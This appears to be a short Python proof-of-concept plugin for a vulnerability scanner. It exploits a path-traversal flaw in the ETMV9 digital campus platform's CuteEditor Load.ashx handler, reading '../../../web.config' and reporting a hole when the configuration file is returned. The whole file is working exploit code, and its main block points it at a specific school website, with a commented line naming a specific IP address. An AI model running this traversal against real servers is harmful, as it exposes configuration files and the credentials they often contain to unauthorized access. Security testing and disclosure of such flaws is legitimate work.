#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:ETMV9数字化校园平台任意下载
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0100796
#google:技术支持:武汉英福软件有限公司 Tel:027-87808981、87211102

def assign(service,arg):
    if service=="etmdcp":
        return True,arg 
    
def  audit(arg):
    url=arg+"ETMDCP/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "<?xml" in res and '<configuration>' in res:
        security_hole(url)
    
if __name__=="__main__":
    from dummy import *
    audit(assign('etmdcp','http://www.bzwsxx.com/')[1])
    # audit(assign('etmdcp','http://221.195.77.78:8080/')[1])